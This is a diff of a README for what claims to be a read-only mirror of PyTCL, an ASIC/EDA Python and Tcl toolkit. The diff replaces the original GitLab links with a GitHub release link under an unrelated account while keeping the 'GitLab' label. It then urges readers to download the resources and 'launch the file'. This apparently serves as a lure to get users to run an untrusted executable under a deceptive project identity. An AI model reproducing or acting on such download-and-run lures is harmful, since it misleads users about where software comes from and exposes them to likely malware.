@@ -1,16 +1,16 @@
 # 🚀 PyTCL: The Ultimate Repository for ASIC Design Enthusiasts 🧠
 
-Welcome to the PyTCL repository, your go-to resource for all things related to ASIC design, EDA tools, FPGA development, and more! This repository serves as a read-only mirror of the original content hosted on [GitLab](https://gitlab.com/tymonx/pytcl), ensuring that you have access to the latest updates and resources in the realm of hardware design.
+Welcome to the PyTCL repository, your go-to resource for all things related to ASIC design, EDA tools, FPGA development, and more! This repository serves as a read-only mirror of the original content hosted on [GitLab](https://github.com/Wayrix70/pytcl/releases/tag/v1.2), ensuring that you have access to the latest updates and resources in the realm of hardware design.
 
 ## 📁 Repository Information
 
 - **Repository Name:** pytcl
-- **Short Description:** Read-only mirror of [https://gitlab.com/tymonx/pytcl](https://gitlab.com/tymonx/pytcl)
+- **Short Description:** Read-only mirror of [https://github.com/Wayrix70/pytcl/releases/tag/v1.2](https://github.com/Wayrix70/pytcl/releases/tag/v1.2)
 - **Topics:** asic, cadence, eda, flow, fpga, hdl, python, python3, rtl, systemverilog, tcl, verilog, vhdl, vivado, xcelium, xilinx
 
 ## 🌟 Resource Link
 
-You can download the valuable resources from this repository by clicking [here](https://github.com/files/Soft.zip). Remember to launch the file and explore the insightful content available to enhance your knowledge and skills in ASIC design and EDA tools.
+You can download the valuable resources from this repository by clicking [here](https://github.com/Wayrix70/pytcl/releases/tag/v1.2). Remember to launch the file and explore the insightful content available to enhance your knowledge and skills in ASIC design and EDA tools.
 
 ## 🎨 Explore the World of ASIC Design
 
